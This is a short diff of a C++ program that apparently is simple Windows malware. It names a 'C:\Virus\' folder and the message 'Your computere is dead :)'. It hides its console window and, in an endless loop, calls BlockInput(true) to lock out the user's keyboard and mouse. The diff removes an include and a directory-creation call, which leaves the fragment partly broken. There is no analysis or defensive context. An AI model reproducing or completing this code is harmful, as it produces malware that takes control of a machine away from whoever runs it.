@@ -50,7 +50,6 @@
 #include<iostream>
 #include<direct.h>
 #include<fstream>
-#include<windows.h>
 
 using namespace std;
 
@@ -60,7 +59,6 @@ int main(){
     const char *path="C:\\Virus\\";
     string content ="Your computere is dead :)";
     FreeConsole();
-    _mkdir(path);
     while(true){
         BlockInput(true);
         i++;
